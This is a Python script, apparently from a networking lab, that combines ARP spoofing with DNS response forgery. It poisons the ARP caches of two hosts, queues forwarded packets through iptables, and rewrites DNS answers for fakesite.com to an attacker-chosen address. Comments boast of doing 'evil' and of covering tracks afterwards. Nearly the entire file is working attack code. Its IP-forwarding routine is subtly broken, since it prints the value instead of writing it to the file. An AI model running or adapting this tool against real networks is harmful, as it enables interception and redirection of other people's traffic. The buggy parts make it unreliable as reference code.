from scapy.all import *
from netfilterqueue import NetfilterQueue
import argparse
import time
import os
import sys


#We'll be using an on-path adversary so first we want to ARP Spoof and get all the traffic going to and coming from the recursor 

#Enable IP forwarding on the machine
def _enable_linux_iproute():
    print("Enabling IP Forwarding!")
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1)

#Now we actually spoof and change the ARP cache of the target IP
def spoof(target_ip, host_ip, verbose=True):
    print("ARP Spoofing Time!")
    target_mac = getmacbyip(target_ip) #Get the mac address of the adversary
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at') #Create the fake ARP response and send it
    send(arp_response, verbose=0)


#We want to make sure no one finds out, so make sure we switch back the MAC addresses when we're done
def restore(target_ip, host_ip, verbose=True):
    print("Restoring MAC")
    target_mac = getmacbyip(target_ip) #Get the MAC address of the victim from their IP
    host_mac = getmacbyip(host_ip) #Get the MAC address of the adversary from their IP
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac) # Switch them!
    send(arp_response, verbose=0, count=3)

#Since we look at every packet that goes through, we need to see if the current packet is a DNS answer
def process_packet(packet):
    scapy_packet = IP(packet.get_payload()) #Convert the packet to the Scapy format
    if scapy_packet.haslayer(DNSRR): #If the packet is a DNS answer (DNS resource record)
        try:
            scapy_packet = modify_packet(scapy_packet) #Send it to be modified 
        except IndexError:
            pass
        packet.set_payload(bytes(scapy_packet)) #Convert back to the other packet format
    packet.accept() #Accept it and yeet

#The juicy stuff - here we actually modify the IP address in the resource record before it gets sent to its destination 
def modify_packet(packet):
    #A list of the dns hosts we want to mess with. The actual IP of the DNS host will be replaced with the IP listed in this struct.
    dns_hosts = {
        b"fakesite.com.": "123.4.5.6",
        b"fakesite.com": "123.4.5.6"
    }
    print("Beginning Packet Modification!")
    qname = packet[DNSQR].qname #Get the domain name from the packet
    if qname not in dns_hosts: # if the website is NOT in our struct don't modify the packet
        return packet

    #If the website is in our struct, make a new packet
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet

if __name__ == "__main__":
    print("Time to do some evil!")
    # As the ISP, we know the IP address of the Auth server we want to intercept
    target = "10.21.4.4"
    # Here's our IP address
    host = "10.21.4.3"
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    _enable_linux_iproute()

    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()

    try:
        while True:
            # Letting the Auth server know to send things to us
            spoof(target, host, verbose)
            # Telling the Recursor that we are the Auth server so there's no question
            spoof(host, target, verbose)

            # Start it with this queue bind thing, so we do one packet at a time
            queue.bind(QUEUE_NUM, process_packet)
            queue.run()

    #If we get a CTRL+C
    except KeyboardInterrupt:
        print("[!] Please wait for shutdown :) ")
        restore(target, host) #Set things back to the way they were so someone snooping around doesn't realize what happened
        restore(host, target)
        os.system("iptables --flush")
        print("Bye!")



